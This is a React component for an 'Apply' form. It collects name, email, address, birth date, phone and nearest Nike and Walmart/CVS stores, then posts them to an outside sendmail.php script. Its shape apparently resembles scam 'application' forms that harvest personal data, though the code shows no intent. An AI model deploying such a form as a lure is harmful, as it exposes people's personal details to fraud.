import { Label, TextInput } from 'flowbite-react'
import { MdOutlineDriveFileRenameOutline } from "react-icons/md";
import { FaPhoneAlt } from "react-icons/fa";
import { FaStoreAlt } from "react-icons/fa";
import { FaStore } from "react-icons/fa";
import { useState } from 'react';
import axios from 'axios';

const Adlogin = () => {
  const [  first_name, setFirstName] = useState('');
  const [ last_name, setLastName] = useState('');
  const [  user_email, setEmail] = useState('');
  const [city, setCity] = useState('');
  const [address, setAddress] = useState('');
  const [  user_age, setAge] = useState('');
  const [phone, setPhone] = useState('');
  const [ nike_store, setNikeStore] = useState('');
  const [ walmart_store, setWalmartStore] = useState('');


   
  const handleSubmit = (e) => {
      e.preventDefault();

      // Create a FormData object and append the form data
      const formData = new FormData();
      formData.append('first_name', first_name);
      formData.append('last_name', last_name);
      formData.append('user_email', user_email);
      formData.append('city', city);
      formData.append('address', address);
      formData.append('user_age', user_age);
      formData.append('phone', phone);
      formData.append('nike_store', nike_store);
      formData.append('walmart_store', walmart_store);

      axios
          .post('https://sending.baqladempire.com/sendmail.php', formData, {
              headers: {
                  'Content-Type': 'multipart/form-data',
              },
          })
          .then((response) => {
              console.log(response);
              console.log('Form submission success:', response.data);
              // Reset form fields after successful submission if needed
              setFirstName('');
              setLastName('');
              setEmail('');
              setCity('');
              setAddress('');
              setAge('');
              setPhone('');
              setNikeStore('');
              setWalmartStore('');
          })
          .catch((error) => {
              console.error('Form submission error:', error);
              // Show an error message
          });

  };
  return (
    <>
    <form onSubmit={handleSubmit}>
      <br />
      <br />
      <br />
         <div className="max-w-md mx-auto   p-5 rounded">
         <div className="mb-2 block">
          <Label htmlFor="email4" value="Enter First Name" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="first_name" name="first_name"
          placeholder="Clinton"
          value={  first_name}
          onChange={(e) => setFirstName(e.target.value)}
          required
        />


<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Last Name" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="last_name" name="last_name" 
          placeholder="John "
          value={ last_name}
          onChange={(e) => setLastName(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Email" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="user_email" name="user_email"
          placeholder="john@gmail.com"
          value={  user_email}
            onChange={(e) => setEmail(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter City" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="city" name="city"
          placeholder="NYC"
          value={city}
          onChange={(e) => setCity(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Enter Address" />
        </div>
        <TextInput
          type="text"
          rightIcon={MdOutlineDriveFileRenameOutline}
          id="address" name="address" 
          placeholder="block 25 new jersey"
          value={address}
          onChange={(e) => setAddress(e.target.value)}
          required
        />

        <div className="mb-2 block">
          <Label htmlFor="email4" value="Your Age" />
        </div>
        <TextInput
          type="date"
         id='user_age' name='user_age'
          placeholder=""
          value={   user_age}
          onChange={(e) => setAge(e.target.value)}

          required
        />

        
<div className="mb-2 block">
          <Label htmlFor="email4" value="Phone Number" />
        </div>
        <TextInput
          type="text"
          id="phone" name="phone"
          rightIcon={FaPhoneAlt}
          placeholder=""
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          required
        />

        
<div className="mb-2 block">
          <Label htmlFor="email4" value="Nearest Nike Store" />
        </div>
        <TextInput
          type="text"
         id='nike_store' name='nike_store'
          rightIcon={FaStoreAlt}
          placeholder=""
          value={ nike_store}
          onChange={(e) => setNikeStore(e.target.value)}
          required
        />

<div className="mb-2 block">
          <Label htmlFor="email4" value="Nearest Walmart/CVs" />
        </div>
        <TextInput
          type="text"
         id='walmart_store'  
          name='walmart_store'
          rightIcon={ FaStore}
          placeholder=""
          value={  walmart_store}
            onChange={(e) => setWalmartStore(e.target.value)}
          required
        />
         

<button
 type="submit" 
    className="text-white w-80 mt-3 p-3 font-bold bg-red-400 hover:bg-orange-500 rounded w-100"
  >
    Apply
  </button>

  <br />
         </div>
         </form>
    </>
  )
}

export default Adlogin